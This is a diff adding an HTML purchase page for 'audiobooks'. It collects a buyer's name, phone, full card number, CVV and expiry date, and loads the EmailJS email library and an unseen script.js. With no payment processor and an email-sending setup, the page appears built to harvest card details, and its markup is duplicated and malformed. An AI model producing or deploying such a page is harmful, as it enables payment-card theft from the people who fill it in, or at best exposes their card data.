@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Digital Product (Audiobooks)</title>
+  <link rel="stylesheet" href="styles.css">
+  <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function(){
+      emailjs.init("user_YourUserID");  // استبدل "YourUserID" بـمعرف المستخدم الخاص بك في EmailJS
+    })();
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h1>Digital Product (Audiobooks)</h1>
+    <form id="purchaseForm">
+      <label for="name">Name:</label>
+      <input type="text" id="name" placeholder="Enter your name" required>
+      
+      <label for="phone">Phone Number:</label>
+      <input type="tel" id="phone" placeholder="Enter your phone number" required>
+      
+      <label for="cardNumber">Credit Card Number:</label>
+      <input type="text" id="cardNumber" placeholder="Enter your card number" required>
+
+      <label for="cvv">CVV:</label>
+      <input type="text" id="cvv" placeholder="Enter CVV" required>
+
+      <label for="expiryDate">Card Expiry Date:</label>
+      <input type="month" id="expiryDate" required>
+      
+      <button type="submit">Submit</button>
+    </form>
+    
+    <h3>Contact Us:</h3>
+    <p>Phone Number: <strong>064513004</strong></p>
+    
+    <div id="userInfo"></div>
+  </div>
+<link rel="stylesheet" href="styles.css">
+  <script src="script.js"></script>
+  <head>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  </head>
+</body>
+</html>
